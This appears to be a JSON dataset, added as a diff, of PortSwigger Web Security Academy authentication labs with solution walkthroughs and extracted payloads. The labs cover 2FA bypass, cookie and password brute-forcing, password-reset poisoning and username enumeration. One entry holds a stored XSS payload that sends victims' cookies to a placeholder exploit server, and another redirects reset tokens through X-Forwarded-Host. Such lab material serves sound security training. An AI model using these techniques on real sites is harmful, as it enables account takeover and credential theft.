@@ -1,0 +1,315 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic",
+    "category": "authentication",
+    "title": "2FA broken logic",
+    "description": "This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.",
+    "solution": "Carlos will not attempt to log in to the website himself.",
+    "payloads": [
+      "wiener:peter",
+      "carlos",
+      "POST /login2",
+      "verify",
+      "GET /login2",
+      "mfa-code"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack",
+    "category": "authentication",
+    "title": "2FA bypass using a brute-force attack",
+    "description": "This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.",
+    "solution": "You will need to use Burp macros in conjunction with Burp Intruder to solve this lab. For more information about macros, please refer to the\nBurp Suite documentation\n. Users proficient in Python might prefer to use the\nTurbo Intruder\nextension, which is available from the BApp store.",
+    "payloads": [
+      "carlos:montoya",
+      "carlos",
+      "GET /login\nPOST /login\nGET /login2",
+      "POST /login2",
+      "mfa-code"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass",
+    "category": "authentication",
+    "title": "2FA simple bypass",
+    "description": "This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.",
+    "solution_steps": [
+      "Log in to your own account. Your 2FA verification code will be sent to you by email. Click the Email client button to access your emails.",
+      "Go to your account page and make a note of the URL.",
+      "Log out of your account.",
+      "Log in using the victim's credentials.",
+      "When prompted for the verification code, manually change the URL to navigate to /my-account . The lab is solved when the page loads."
+    ],
+    "solution": "1. Log in to your own account. Your 2FA verification code will be sent to you by email. Click the Email client button to access your emails.\n2. Go to your account page and make a note of the URL.\n3. Log out of your account.\n4. Log in using the victim's credentials.\n5. When prompted for the verification code, manually change the URL to navigate to /my-account . The lab is solved when the page loads.",
+    "payloads": [
+      "wiener:peter",
+      "carlos:montoya",
+      "/my-account"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie",
+    "category": "authentication",
+    "title": "Brute-forcing a stay-logged-in cookie",
+    "description": "This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.",
+    "solution_steps": [
+      "With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a stay-logged-in cookie.",
+      "Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is wiener:51dc30ddc473d43a6011e9ebba6ca770 . Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows: base64(username+':'+md5HashOfPassword)",
+      "Log out of your account.",
+      "In the most recent GET /my-account?id=wiener request highlight the stay-logged-in cookie parameter and send the request to Burp Intruder.",
+      "In Burp Intruder, notice that the stay-logged-in cookie has been automatically added as a payload position. Add your own password as a single payload.",
+      "Under Payload processing , add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted. Hash: MD5 Add prefix: wiener: Encode: Base64-encode",
+      "As the Update email button is only displayed when you access the My\n                        account page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the Settings side panel, add a grep match rule to flag any responses containing the string Update email . Start the attack.",
+      "Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.",
+      "Make the following adjustments and then repeat this attack: Remove your own password from the payload list and add the list of candidate passwords instead. Change the id parameter in the request URL to carlos instead of wiener . Change the Add prefix rule to add carlos: instead of wiener: .",
+      "When the attack is finished, the lab will be solved. Notice that only one request returned a response containing Update email . The payload from this request is the valid stay-logged-in cookie for Carlos's account."
+    ],
+    "solution": "1. With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a stay-logged-in cookie.\n2. Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is wiener:51dc30ddc473d43a6011e9ebba6ca770 . Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows: base64(username+':'+md5HashOfPassword)\n3. Log out of your account.\n4. In the most recent GET /my-account?id=wiener request highlight the stay-logged-in cookie parameter and send the request to Burp Intruder.\n5. In Burp Intruder, notice that the stay-logged-in cookie has been automatically added as a payload position. Add your own password as a single payload.\n6. Under Payload processing , add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted. Hash: MD5 Add prefix: wiener: Encode: Base64-encode\n7. As the Update email button is only displayed when you access the My\n                        account page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the Settings side panel, add a grep match rule to flag any responses containing the string Update email . Start the attack.\n8. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.\n9. Make the following adjustments and then repeat this attack: Remove your own password from the payload list and add the list of candidate passwords instead. Change the id parameter in the request URL to carlos instead of wiener . Change the Add prefix rule to add carlos: instead of wiener: .\n10. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing Update email . The payload from this request is the valid stay-logged-in cookie for Carlos's account.",
+    "payloads": [
+      "wiener:peter",
+      "carlos",
+      "stay-logged-in",
+      "wiener:51dc30ddc473d43a6011e9ebba6ca770",
+      "base64(username+':'+md5HashOfPassword)",
+      "GET /my-account?id=wiener",
+      "wiener:",
+      "Base64-encode",
+      "Update email",
+      "wiener",
+      "carlos:"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking",
+    "category": "authentication",
+    "title": "Offline password cracking",
+    "description": "This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos'sstay-logged-incookie and use it to crack his password. Then, log in ascarlosand delete his account from the \"My account\" page.",
+    "solution_steps": [
+      "With Burp running, use your own account to investigate the \"Stay logged in\" functionality. Notice that the stay-logged-in cookie is Base64 encoded.",
+      "In the Proxy > HTTP history tab,  go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows: username+':'+md5HashOfPassword",
+      "You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.",
+      "Go to the exploit server and make a note of the URL.",
+      "Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID: <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>",
+      "On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.",
+      "Decode the cookie in Burp Decoder. The result will be: carlos:26323c16d5f4dabff3bb136f2460a943",
+      "Copy the hash and paste it into a search engine. This will reveal that the password is onceuponatime .",
+      "Log in to the victim's account, go to the \"My account\" page, and delete their account to solve the lab."
+    ],
+    "solution": "1. With Burp running, use your own account to investigate the \"Stay logged in\" functionality. Notice that the stay-logged-in cookie is Base64 encoded.\n2. In the Proxy > HTTP history tab,  go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows: username+':'+md5HashOfPassword\n3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.\n4. Go to the exploit server and make a note of the URL.\n5. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID: <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>\n6. On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.\n7. Decode the cookie in Burp Decoder. The result will be: carlos:26323c16d5f4dabff3bb136f2460a943\n8. Copy the hash and paste it into a search engine. This will reveal that the password is onceuponatime .\n9. Log in to the victim's account, go to the \"My account\" page, and delete their account to solve the lab.",
+    "payloads": [
+      "stay-logged-in",
+      "carlos",
+      "wiener:peter",
+      "username+':'+md5HashOfPassword",
+      "<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>",
+      "carlos:26323c16d5f4dabff3bb136f2460a943",
+      "onceuponatime"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change",
+    "category": "authentication",
+    "title": "Password brute-force via password change",
+    "description": "This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his \"My account\" page.",
+    "solution_steps": [
+      "With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.",
+      "Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states Current password is incorrect . If you enter a valid current password, but two different new passwords, the message says New passwords do not match . We can use this message to enumerate correct passwords.",
+      "Enter your correct current password and two new passwords that do not match. Send this POST /my-account/change-password request to Burp Intruder.",
+      "In Burp Intruder, change the username parameter to carlos and add a payload position to the current-password parameter. Make sure that the new password parameters are set to two different values. For example: username=carlos&current-password=\u00a7incorrect-password\u00a7&new-password-1=123&new-password-2=abc",
+      "In the Payloads side panel, enter the list of passwords as the payload set.",
+      "Click Settings to open the Settings side panel, then add a grep match rule to flag responses containing New passwords do not match . Start the attack.",
+      "When the attack finished, notice that one response was found that contains the New passwords do not match message. Make a note of this password.",
+      "In the browser, log out of your own account and lock back in with the username carlos and the password that you just identified.",
+      "Click My account to solve the lab."
+    ],
+    "solution": "1. With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.\n2. Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states Current password is incorrect . If you enter a valid current password, but two different new passwords, the message says New passwords do not match . We can use this message to enumerate correct passwords.\n3. Enter your correct current password and two new passwords that do not match. Send this POST /my-account/change-password request to Burp Intruder.\n4. In Burp Intruder, change the username parameter to carlos and add a payload position to the current-password parameter. Make sure that the new password parameters are set to two different values. For example: username=carlos&current-password=\u00a7incorrect-password\u00a7&new-password-1=123&new-password-2=abc\n5. In the Payloads side panel, enter the list of passwords as the payload set.\n6. Click Settings to open the Settings side panel, then add a grep match rule to flag responses containing New passwords do not match . Start the attack.\n7. When the attack finished, notice that one response was found that contains the New passwords do not match message. Make a note of this password.\n8. In the browser, log out of your own account and lock back in with the username carlos and the password that you just identified.\n9. Click My account to solve the lab.",
+    "payloads": [
+      "wiener:peter",
+      "carlos",
+      "Current password is incorrect",
+      "New passwords do not match",
+      "POST /my-account/change-password",
+      "username",
+      "current-password",
+      "username=carlos&current-password=\u00a7incorrect-password\u00a7&new-password-1=123&new-password-2=abc"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic",
+    "category": "authentication",
+    "title": "Password reset broken logic",
+    "description": "This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his \"My account\" page.",
+    "solution_steps": [
+      "With Burp running, click the Forgot your password? link and enter your own username.",
+      "Click the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.",
+      "In Burp, go to Proxy > HTTP history and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the POST /forgot-password?temp-forgot-password-token request contains the username as hidden input. Send this request to Burp Repeater.",
+      "In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the temp-forgot-password-token parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.",
+      "In the browser, request a new password reset and change your password again. Send the POST /forgot-password?temp-forgot-password-token request to Burp Repeater again.",
+      "In Burp Repeater, delete the value of the temp-forgot-password-token parameter in both the URL and request body. Change the username parameter to carlos . Set the new password to whatever you want and send the request.",
+      "In the browser, log in to Carlos's account using the new password you just set. Click My account to solve the lab."
+    ],
+    "solution": "1. With Burp running, click the Forgot your password? link and enter your own username.\n2. Click the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.\n3. In Burp, go to Proxy > HTTP history and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the POST /forgot-password?temp-forgot-password-token request contains the username as hidden input. Send this request to Burp Repeater.\n4. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the temp-forgot-password-token parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.\n5. In the browser, request a new password reset and change your password again. Send the POST /forgot-password?temp-forgot-password-token request to Burp Repeater again.\n6. In Burp Repeater, delete the value of the temp-forgot-password-token parameter in both the URL and request body. Change the username parameter to carlos . Set the new password to whatever you want and send the request.\n7. In the browser, log in to Carlos's account using the new password you just set. Click My account to solve the lab.",
+    "payloads": [
+      "wiener:peter",
+      "carlos",
+      "POST /forgot-password?temp-forgot-password-token",
+      "temp-forgot-password-token",
+      "username"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware",
+    "category": "authentication",
+    "title": "Password reset poisoning via middleware",
+    "description": "This lab is vulnerable to password reset poisoning. The usercarloswill carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.\n\n            You can log in to your own account using the following credentials:wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.",
+    "solution_steps": [
+      "With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.",
+      "Send the POST /forgot-password request to Burp Repeater. Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.",
+      "Go to the exploit server and make a note of your exploit server URL.",
+      "Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "Change the username parameter to carlos and send the request.",
+      "Go to the exploit server and open the access log. You should see a GET /forgot-password request, which contains the victim's token as a query parameter. Make a note of this token.",
+      "Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into the browser and change the value of the temp-forgot-password-token parameter to the value that you stole from the victim.",
+      "Load this URL and set a new password for Carlos's account.",
+      "Log in to Carlos's account using the new password to solve the lab."
+    ],
+    "solution": "1. With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.\n2. Send the POST /forgot-password request to Burp Repeater. Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.\n3. Go to the exploit server and make a note of your exploit server URL.\n4. Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\n5. Change the username parameter to carlos and send the request.\n6. Go to the exploit server and open the access log. You should see a GET /forgot-password request, which contains the victim's token as a query parameter. Make a note of this token.\n7. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into the browser and change the value of the temp-forgot-password-token parameter to the value that you stole from the victim.\n8. Load this URL and set a new password for Carlos's account.\n9. Log in to Carlos's account using the new password to solve the lab.",
+    "payloads": [
+      "carlos",
+      "wiener:peter",
+      "POST /forgot-password",
+      "X-Forwarded-Host",
+      "X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "username",
+      "GET /forgot-password",
+      "temp-forgot-password-token"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request",
+    "category": "authentication",
+    "title": "Broken brute-force protection, multiple credentials per request",
+    "description": "This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.",
+    "solution_steps": [
+      "With Burp running, investigate the login page. Notice that the POST /login request submits the login credentials in JSON format. Send this request to Burp Repeater.",
+      "In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example: \"username\" : \"carlos\",\n\"password\" : [\n    \"123456\",\n    \"password\",\n    \"qwerty\"\n    ...\n]",
+      "Send the request. This will return a 302 response.",
+      "Right-click on this request and select Show response in browser . Copy the URL and load it in the browser. The page loads and you are logged in as carlos .",
+      "Click My account to access Carlos's account page and solve the lab."
+    ],
+    "solution": "1. With Burp running, investigate the login page. Notice that the POST /login request submits the login credentials in JSON format. Send this request to Burp Repeater.\n2. In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example: \"username\" : \"carlos\",\n\"password\" : [\n    \"123456\",\n    \"password\",\n    \"qwerty\"\n    ...\n]\n3. Send the request. This will return a 302 response.\n4. Right-click on this request and select Show response in browser . Copy the URL and load it in the browser. The page loads and you are logged in as carlos .\n5. Click My account to access Carlos's account page and solve the lab.",
+    "payloads": [
+      "carlos",
+      "POST /login",
+      "JSON",
+      "\"username\" : \"carlos\",\n\"password\" : [\n    \"123456\",\n    \"password\",\n    \"qwerty\"\n    ...\n]"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block",
+    "category": "authentication",
+    "title": "Broken brute-force protection, IP block",
+    "description": "This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.",
+    "solution": "Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension. However, it is possible to solve the lab without using these advanced features.",
+    "payloads": [
+      "wiener:peter",
+      "carlos",
+      "POST /login",
+      "username",
+      "password"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock",
+    "category": "authentication",
+    "title": "Username enumeration via account lock",
+    "description": "This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
+    "solution_steps": [
+      "With Burp running, investigate the login page and submit an invalid username and password. Send the POST /login request to Burp Intruder.",
+      "Select Cluster bomb attack from the attack type drop-down menu. Add a payload position to the username parameter. Add a blank payload position to the end of the request body by clicking Add \u00a7 . The result should look something like this: username=\u00a7invalid-username\u00a7&password=example\u00a7\u00a7",
+      "In the Payloads side panel, add the list of usernames for the first payload position. For the second payload position, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.",
+      "In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: You have made too many incorrect login attempts. Make a note of this username.",
+      "Create a new Burp Intruder attack on the POST /login request, but this time select Sniper attack from the attack type drop-down menu. Set the username parameter to the username that you just identified and add a payload position to the password parameter.",
+      "Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.",
+      "In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.",
+      "Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab."
+    ],
+    "solution": "1. With Burp running, investigate the login page and submit an invalid username and password. Send the POST /login request to Burp Intruder.\n2. Select Cluster bomb attack from the attack type drop-down menu. Add a payload position to the username parameter. Add a blank payload position to the end of the request body by clicking Add \u00a7 . The result should look something like this: username=\u00a7invalid-username\u00a7&password=example\u00a7\u00a7\n3. In the Payloads side panel, add the list of usernames for the first payload position. For the second payload position, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.\n4. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: You have made too many incorrect login attempts. Make a note of this username.\n5. Create a new Burp Intruder attack on the POST /login request, but this time select Sniper attack from the attack type drop-down menu. Set the username parameter to the username that you just identified and add a payload position to the password parameter.\n6. Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.\n7. In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.\n8. Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.",
+    "payloads": [
+      "POST /login",
+      "username",
+      "username=\u00a7invalid-username\u00a7&password=example\u00a7\u00a7",
+      "You have made too many incorrect login attempts.",
+      "password"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses",
+    "category": "authentication",
+    "title": "Username enumeration via different responses",
+    "description": "This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:",
+    "solution_steps": [
+      "With Burp running, investigate the login page and submit an invalid username and password.",
+      "In Burp, go to Proxy > HTTP history and find the POST /login request. Highlight the value of the username parameter in the request and send it to Burp Intruder.",
+      "In Burp Intruder, notice that the username parameter is automatically set as a payload position. This position is indicated by two \u00a7 symbols, for example: username=\u00a7invalid-username\u00a7 . Leave the password as any static value for now.",
+      "Make sure that Sniper attack is selected.",
+      "In the Payloads side panel, make sure that the Simple list payload type is selected.",
+      "Under Payload configuration , paste the list of candidate usernames. Finally, click Start attack . The attack will start in a new window.",
+      "When the attack is finished, examine the Length column in the results table. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username , but this response says Incorrect password . Make a note of the username in the Payload column.",
+      "Close the attack and go back to the Intruder tab. Click Clear \u00a7 , then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this: username=identified-user&password=\u00a7invalid-password\u00a7",
+      "In the Payloads side panel, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack .",
+      "When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column.",
+      "Log in using the username and password that you identified and access the user account page to solve the lab. Note It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible."
+    ],
+    "solution": "1. With Burp running, investigate the login page and submit an invalid username and password.\n2. In Burp, go to Proxy > HTTP history and find the POST /login request. Highlight the value of the username parameter in the request and send it to Burp Intruder.\n3. In Burp Intruder, notice that the username parameter is automatically set as a payload position. This position is indicated by two \u00a7 symbols, for example: username=\u00a7invalid-username\u00a7 . Leave the password as any static value for now.\n4. Make sure that Sniper attack is selected.\n5. In the Payloads side panel, make sure that the Simple list payload type is selected.\n6. Under Payload configuration , paste the list of candidate usernames. Finally, click Start attack . The attack will start in a new window.\n7. When the attack is finished, examine the Length column in the results table. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username , but this response says Incorrect password . Make a note of the username in the Payload column.\n8. Close the attack and go back to the Intruder tab. Click Clear \u00a7 , then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this: username=identified-user&password=\u00a7invalid-password\u00a7\n9. In the Payloads side panel, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack .\n10. When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column.\n11. Log in using the username and password that you identified and access the user account page to solve the lab. Note It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible.",
+    "payloads": [
+      "POST /login",
+      "username",
+      "username=\u00a7invalid-username\u00a7",
+      "Invalid username",
+      "Incorrect password",
+      "password",
+      "username=identified-user&password=\u00a7invalid-password\u00a7"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing",
+    "category": "authentication",
+    "title": "Username enumeration via response timing",
+    "description": "This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
+    "solution": "To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.",
+    "payloads": [
+      "wiener:peter",
+      "POST /login",
+      "X-Forwarded-For",
+      "username",
+      "password"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses",
+    "category": "authentication",
+    "title": "Username enumeration via subtly different responses",
+    "description": "This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:",
+    "solution_steps": [
+      "With Burp running, submit an invalid username and password. Highlight the username parameter in the POST /login request and send it to Burp Intruder.",
+      "Go to Intruder . Notice that the username parameter is automatically marked as a payload position.",
+      "In the Payloads side panel, make sure that the Simple list payload type is selected and add the list of candidate usernames.",
+      "Click on the Settings tab to open the Settings side panel. Under Grep - Extract , click Add . In the dialog that appears, scroll down through the response until you find the error message Invalid username or password. . Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click OK and then start the attack.",
+      "When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different.",
+      "Look closer at this response and notice that it contains a typo in the error message - instead of a full stop/period, there is a trailing space. Make a note of this username.",
+      "Close the results window and go back to the Intruder tab. Insert the username you just identified and add a payload position to the password parameter: username=identified-user&password=\u00a7invalid-password\u00a7",
+      "In the Payloads side panel, clear the list of usernames and replace it with the list of passwords. Start the attack.",
+      "When the attack is finished, notice that one of the requests received a 302 response. Make a note of this password.",
+      "Log in using the username and password that you identified and access the user account page to solve the lab. Note It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible."
+    ],
+    "solution": "1. With Burp running, submit an invalid username and password. Highlight the username parameter in the POST /login request and send it to Burp Intruder.\n2. Go to Intruder . Notice that the username parameter is automatically marked as a payload position.\n3. In the Payloads side panel, make sure that the Simple list payload type is selected and add the list of candidate usernames.\n4. Click on the Settings tab to open the Settings side panel. Under Grep - Extract , click Add . In the dialog that appears, scroll down through the response until you find the error message Invalid username or password. . Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click OK and then start the attack.\n5. When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different.\n6. Look closer at this response and notice that it contains a typo in the error message - instead of a full stop/period, there is a trailing space. Make a note of this username.\n7. Close the results window and go back to the Intruder tab. Insert the username you just identified and add a payload position to the password parameter: username=identified-user&password=\u00a7invalid-password\u00a7\n8. In the Payloads side panel, clear the list of usernames and replace it with the list of passwords. Start the attack.\n9. When the attack is finished, notice that one of the requests received a 302 response. Make a note of this password.\n10. Log in using the username and password that you identified and access the user account page to solve the lab. Note It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible.",
+    "payloads": [
+      "username",
+      "POST /login",
+      "Invalid username or password.",
+      "password",
+      "username=identified-user&password=\u00a7invalid-password\u00a7"
+    ]
+  }
+]
